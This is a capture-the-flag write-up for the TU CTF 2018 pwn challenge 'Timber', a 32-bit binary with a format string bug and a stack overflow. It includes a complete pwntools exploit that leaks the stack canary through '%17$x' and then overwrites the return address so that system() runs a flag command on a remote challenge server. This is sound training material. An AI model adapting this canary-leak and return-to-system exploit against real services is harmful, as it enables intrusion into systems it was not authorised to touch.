[](ctf=tu-ctf-2018)
[](type=pwn)
[](tags=rop)
[](tools=radare2,gdb-peda,pwntools,python)

# Timber

We are given a [binary](../timber) with a stack canary, a stack based buffer overflow and a format string vulnerability. The binary mimics the popular dating application Tinder!

```bash
vagrant@amy:~/share/timber$ file timber
timber: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5f25b2cc724fad9767439392ba05ac91177ae3ee, not stripped
```

```bash
vagrant@amy:~/share/timber$ ./timber
Welcome to Timber™!
The world's largest lumberjack dating site
Please enter your name: jack
Alright jack
Let's find you a match!
Options:
 l: Swipe Left
 r: Swipe Right
 s: Super Swipe

Eastern Pine age 4183? l
American Elm age 502? r
American Beech age 796? s
+Match Found!
----------------- American Beech ----------------
[American Beech] So, are you a tree hugger or what.
hello
[American Beech] Pff, lumberjacks are all the same.
```

The format string vulnerability can be used to leak the stack canary allowing us to exploit the binary with a ROP chain.

```python
from pwn import *

context(arch='i386', os='linux')
# p = process('./timber')
p = remote('18.222.250.47 ', 12345)

flag_cmd = 0x8048ba0
system = 0x08048500

p.sendline('%17$x')
p.recvuntil('Alright ')
leak = p.recvuntil('\n').strip()
canary = int(leak, 16)

log.info('Canary: {}'.format(hex(canary)))

payload = ''
payload += 'a' * 48
payload += p32(canary)
payload += 'a' * 8
payload += p32(system)
payload += 'a' * 4
payload += p32(flag_cmd)

p.sendline('s')

p.sendline(payload)
p.recvuntil('same.\n')
flag = p.recvuntil('\n').strip()
log.success(flag)
```
